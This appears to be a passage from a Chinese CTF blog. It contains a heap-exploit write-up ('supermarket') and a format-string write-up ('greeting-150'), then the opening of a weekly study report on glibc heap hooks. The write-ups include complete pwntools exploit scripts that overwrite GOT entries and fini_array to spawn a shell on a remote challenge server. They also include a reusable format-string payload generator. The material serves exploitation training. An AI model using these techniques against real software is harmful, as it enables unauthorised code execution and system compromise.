log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;supermarket&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;111.198.29.45&quot;</span></span><br><span class="line">remotePort = <span class="number">57966</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">index, size, text</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">index</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">index, size, text</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sa(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;0&#x27;</span> * (<span class="number">0x80</span> - <span class="number">1</span>))</span><br><span class="line">	ad(<span class="number">1</span>, <span class="number">0x10</span>, <span class="string">&#x27;1&#x27;</span> * (<span class="number">0x10</span> - <span class="number">1</span>))</span><br><span class="line">	md(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">#不要向free掉的数据块中写入数据. 不然后期无法malloc</span></span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0x10</span>, <span class="string">&#x27;2&#x27;</span> * (<span class="number">0x10</span> - <span class="number">1</span>))</span><br><span class="line">	p = p32(<span class="number">0x32</span>) + p32(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">	p += p32(<span class="number">0x10</span>) + p32(exe.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">	p += <span class="string">&#x27;\x19&#x27;</span></span><br><span class="line">	md(<span class="number">0</span>, <span class="number">0x80</span>, p) <span class="comment"># modify dscription addr as free got addr</span></span><br><span class="line">	p2 = p32(exe.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	md(<span class="number">2</span>, <span class="number">0x10</span>, p2) <span class="comment">#modify free got addr as puts got addr</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># leaking</span></span><br><span class="line">	p3 = p32(<span class="number">0x32</span>) + p32(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">	p3 += p32(<span class="number">0x10</span>) + p32(exe.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">	p3 += <span class="string">&#x27;\x19&#x27;</span></span><br><span class="line">	md(<span class="number">0</span>, <span class="number">0x80</span>, p3)</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">2</span>) <span class="comment">#puts atoi addr in libc</span></span><br><span class="line">	atoi_addr = u32(r(<span class="number">4</span>))</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">	libc_base = atoi_addr - lib.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	sys_addr = libc_base + lib.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	sh_addr = libc_base + <span class="number">0x0015902b</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#modify got addr as system</span></span><br><span class="line">	ad(<span class="number">3</span>, <span class="number">0x10</span>, <span class="string">&#x27;3&#x27;</span> * (<span class="number">0x10</span> - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">	p4 = p32(<span class="number">0x32</span>) + p32(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">	p4 += p32(<span class="number">0x10</span>) + p32(<span class="number">0x0</span>)</span><br><span class="line">	p4 += p32(<span class="number">0x19</span>) + p32(<span class="number">0x0</span>) * <span class="number">5</span></span><br><span class="line"></span><br><span class="line">	p4 += p32(<span class="number">0x21</span>) <span class="comment"># modify item 3</span></span><br><span class="line"></span><br><span class="line">	p4 += p32(<span class="number">0x33</span>) <span class="comment">#3</span></span><br><span class="line">	p4 += p32(<span class="number">0x0</span>) * <span class="number">4</span></span><br><span class="line">	p4 += p32(<span class="number">0x10</span>)</span><br><span class="line">	p4 += p32(exe.got[<span class="string">&#x27;atoi&#x27;</span>]) + <span class="string">&#x27;\x19&#x27;</span></span><br><span class="line"></span><br><span class="line">	md(<span class="number">0</span>, <span class="number">0x80</span>, p4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	p5 = p32(sys_addr)</span><br><span class="line">	md(<span class="number">3</span>, <span class="number">0x10</span>, p5) <span class="comment"># modify atoi got table as system</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># call system with /bin/sh</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	exe = ELF(exeFile)</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			lib = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">		<span class="comment">#io = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)</span></span><br><span class="line">		io = exe.process()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>



      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/03/wp-supermarket/" data-id="ckhemv839003mwdcm7u007z9f" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-fmt-greeting" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/03/wp-fmt-greeting/" class="article-date">
  <time datetime="2020-04-02T17:21:48.000Z" itemprop="datePublished">2020-04-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/03/wp-fmt-greeting/">wp fmt-greeting</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="greeting-150"><a href="#greeting-150" class="headerlink" title="greeting-150"></a>greeting-150</h1><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>字符串漏洞</p>
<p>源代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line"><span class="keyword">char</span> v5; <span class="comment">// [esp+5Ch] [ebp-44h]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please tell me your name... &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !getnline(&amp;v5, <span class="number">0x40</span>) )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t ignore me ;( &quot;</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;Nice to meet you, %s :)\n&quot;</span>, &amp;v5);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(&amp;s); #字符串漏洞</span><br></pre></td></tr></table></figure>



<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>由于程序中只有一个字符串漏洞, 执行字符串漏洞后结束,这时就需要覆盖fini_array为start函数进行再次执行程序同时修改strlen的got表为system plt地址.</p>
<p>简单介绍一下: fini_array, 在<code>main</code>函数前会调用<code>.init</code>段代码和<code>.init_arra</code>y段的函数数组中每一个函数指针。同样的，<code>main</code>函数结束后也会调用<code>.fin</code>i段代码和<code>.fini._arrary</code>段的函数数组中的每一个函数指针</p>
<h3 id="字符串漏洞设置大的值注意的地方"><a href="#字符串漏洞设置大的值注意的地方" class="headerlink" title="字符串漏洞设置大的值注意的地方"></a>字符串漏洞设置大的值注意的地方</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数</span><br><span class="line">h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数</span><br></pre></td></tr></table></figure>

<ol>
<li>第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16.</li>
<li>之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为<code>%30c% offset$hhn</code></li>
<li>当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 =  0xD0（208），也就是填入%208c%offset$hhn即可</li>
</ol>
<p>单字节覆盖常用脚本(ctf-wiki):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span> <span class="comment"># prev: payload 长度,  word: 单个字符, index: 偏移地址 + i</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word: <span class="comment">#若payload长度小于单个字符的值时</span></span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span> <span class="comment">#直接写入差值,补齐</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word: <span class="comment">#若payload长度等于单个字符的值时</span></span><br><span class="line">        result = <span class="number">0</span> <span class="comment">#不写</span></span><br><span class="line">    <span class="keyword">else</span>:       <span class="comment">#若payload长度大于单个字符的值时</span></span><br><span class="line">        result = <span class="number">256</span> + word - prev  <span class="comment">#通过单个字符溢出来打</span></span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span> <span class="comment">#添加自payload</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i) <span class="comment">#32位将要覆盖的地址</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i) <span class="comment">#64位将要覆盖的地址</span></span><br><span class="line">    prev = <span class="built_in">len</span>(payload) <span class="comment">#获取payload长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="comment">#传入,payload长度, 目标字节, 偏移</span></span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#fmt_str(12, 4, exe.got[&#x27;strlen&#x27;], exe.plt[&#x27;system&#x27;])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">其中每个参数的含义基本如下</span></span><br><span class="line"><span class="string">    offset表示要覆盖的地址最初的偏移</span></span><br><span class="line"><span class="string">    size表示机器字长</span></span><br><span class="line"><span class="string">    addr表示将要覆盖的地址。</span></span><br><span class="line"><span class="string">    target表示我们要覆盖为的目的变量值。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<p>通过上面的介绍, 根据以上脚本写字符串漏洞原理写exp</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;greeting-150&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;111.198.29.45&quot;</span></span><br><span class="line">remotePort = <span class="number">46553</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ru(<span class="string">&#x27;... &#x27;</span>)</span><br><span class="line"></span><br><span class="line">	strlen_got = exe.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">	<span class="comment"># ELF Termination Funciton Talbe</span></span><br><span class="line">	<span class="comment"># strlen_got 0x08049a54</span></span><br><span class="line">	fini_array = <span class="number">0x08049934</span></span><br><span class="line">	start_addr = <span class="number">0x080484F0</span></span><br><span class="line">	system_plt = <span class="number">0x08048490</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># &#x27;Nice to meet you, %s:)&#x27; + str</span></span><br><span class="line">	<span class="comment"># offset 12</span></span><br><span class="line">	offset = <span class="number">12</span></span><br><span class="line">	prelen = <span class="built_in">len</span>(<span class="string">&#x27;Nice to meet you, &#x27;</span>)</span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;strlen_got: &#x27;</span> + <span class="built_in">hex</span>(strlen_got))</span><br><span class="line">	li(<span class="string">&#x27;fini_array: &#x27;</span> + <span class="built_in">hex</span>(fini_array))</span><br><span class="line"></span><br><span class="line">	p = <span class="string">&#x27;AA&#x27;</span> <span class="comment">#aliament</span></span><br><span class="line">	p += p32(strlen_got + <span class="number">2</span>)</span><br><span class="line">	p += p32(fini_array + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	p += p32(strlen_got)</span><br><span class="line">	p += p32(fini_array)</span><br><span class="line">	<span class="comment">#modify highword(strlen_got)</span></span><br><span class="line">	p += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x0804</span> - <span class="number">0x12</span> - prelen) + <span class="string">&#x27;c%&#x27;</span> + <span class="built_in">str</span>(offset) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">    <span class="comment">#modify highword(fini_arry_addr)</span></span><br><span class="line">	p += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">1</span>) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#modify lowword(system_plt)</span></span><br><span class="line">	p += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x8490</span> - <span class="number">0x804</span>) + <span class="string">&#x27;c%&#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">2</span>) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">	<span class="comment">#modify lowword(fini_plt)</span></span><br><span class="line">	p += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x84F0</span> - <span class="number">0x8490</span>) + <span class="string">&#x27;c%&#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">3</span>) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">	sl(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libFile)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/03/wp-fmt-greeting/" data-id="ckhemv82j002twdcmcsof25ju" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-weekly-report-1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/28/weekly-report-1/" class="article-date">
  <time datetime="2020-03-28T10:24:50.000Z" itemprop="datePublished">2020-03-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/summary/">summary</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/28/weekly-report-1/">2020-03-28 周报</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="2020-03-28-周报"><a href="#2020-03-28-周报" class="headerlink" title="2020-03-28 周报"></a>2020-03-28 周报</h1><h3 id="这周在干什么"><a href="#这周在干什么" class="headerlink" title="这周在干什么?"></a>这周在干什么?</h3><p>百变不离其宗,正在学习heap的各种套路<br>目前先对堆进行一点总结, 也是刚入门.这个星期昨天才开始搞…. <del>_</del>…..可悲可悲….</p>
<h4 id="先说一下各种常见的hook吧-堆中常见"><a href="#先说一下各种常见的hook吧-堆中常见" class="headerlink" title="先说一下各种常见的hook吧 (堆中常见)."></a>先说一下各种常见的hook吧 (堆中常见).</h4><p>__malloc_hook<br>这是一个函数指针变量，指向的是：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">function</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">void</span> * caller)</span> </span></span><br></pre></td></tr></table></figure>

<p>其中caller是表示在栈中调用malloc的函数的时候的函数地址，%p可以打印出他的地址</p>
<ul>
<li>__free_hook<br> 同样这个也是一个函数指针变量，指向的是：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">void</span> * ptr, <span class="keyword">void</span> * caller)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>__realloc_hook<br> 这也是指向一个函数指针变量，指向的是:</li>
</ul>
